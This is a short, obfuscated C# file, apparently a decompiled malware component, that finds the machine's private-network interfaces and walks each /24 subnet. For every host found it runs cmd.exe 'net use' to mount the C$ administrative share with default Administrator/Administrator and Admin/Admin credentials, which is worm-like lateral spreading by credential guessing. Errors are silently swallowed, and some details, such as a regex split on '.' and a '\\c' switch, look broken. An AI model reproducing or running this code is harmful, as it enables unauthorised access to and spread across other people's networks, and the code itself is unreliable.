using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace oiBbJupDERGF;

internal class MltrzlfJFneL
{
	public static void mosJTxbEzXy()
	{
		List<NtENiRxomjX> list = NtENiRxomjX.QATTzxWamH();
		foreach (NtENiRxomjX item in list)
		{
			try
			{
				if (item.SyhGYOuByFxVX.StartsWith("10.") || item.SyhGYOuByFxVX.StartsWith("172.16.") || item.SyhGYOuByFxVX.StartsWith("192.168."))
				{
					hGMPkAUdFlhNa.rSRyQIBYzzXJ(item.HpKrQrpxkDp, item.SyhGYOuByFxVX, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		foreach (NtENiRxomjX item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string vnywcWYqKW = regex.Split(item2.SyhGYOuByFxVX)[0] + "." + regex.Split(item2.SyhGYOuByFxVX)[1] + "." + regex.Split(item2.SyhGYOuByFxVX)[2];
				List<string> list2 = robdzqDyhktM.WdLCPWkGLXe(vnywcWYqKW);
				foreach (string item3 in list2)
				{
					if (item2.SyhGYOuByFxVX.StartsWith("10.") || item2.SyhGYOuByFxVX.StartsWith("172.16.") || item2.SyhGYOuByFxVX.StartsWith("192.168."))
					{
						IkMjOMZbHrXB.TscPplUQcQPqNrJAe("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						IkMjOMZbHrXB.TscPplUQcQPqNrJAe("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
